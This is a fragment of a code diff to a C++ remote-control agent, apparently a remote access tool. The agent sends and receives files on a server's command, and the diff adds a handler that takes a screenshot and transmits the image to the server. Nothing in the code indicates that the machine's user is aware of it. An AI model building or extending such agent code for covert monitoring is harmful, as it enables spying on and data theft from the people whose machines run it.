@@ -38,7 +38,7 @@ bool Agent::Logic()
 	std::string cmd = packet.ExtractString();
 
 	// send file request
-	if (packetType == PacketType::Integers)
+	if (packetType == PacketType::FileRequest)
 	{
 		std::string& filename = cmd;
 
@@ -65,7 +65,7 @@ bool Agent::Logic()
 	}
 
 	// file receive request
-	else if (packetType == PacketType::Bytes)
+	else if (packetType == PacketType::FileTransmit)
 	{
 		std::string& filename = cmd;
 		uint32_t filesize = packet.ExtractInt();
@@ -81,6 +81,33 @@ bool Agent::Logic()
 		return true;
 	}
 	
+	else if (packetType == PacketType::Screenshot)
+	{
+		std::vector<BYTE> imageBytes;
+
+		command.TakeScreenshot(imageBytes);
+		packet.InsertInt(imageBytes.size());
+
+		// send image size
+		if (not serverConn.Send(packet))
+		{
+			std::cerr << "Error at Send (image size)." << std::endl;
+			return false;
+		}
+
+		// send the image bytes
+		packet.Clear(packet.GetPacketType());
+		packet.InsertBytes(imageBytes);
+
+		if (not serverConn.Send(packet))
+		{
+			std::cerr << "Error at Send (image bytes)." << std::endl;
+			return false;
+		}
+
+		return true;
+
+	}
 
 	// change current dir
 	else if (packetType == PacketType::Pwd)
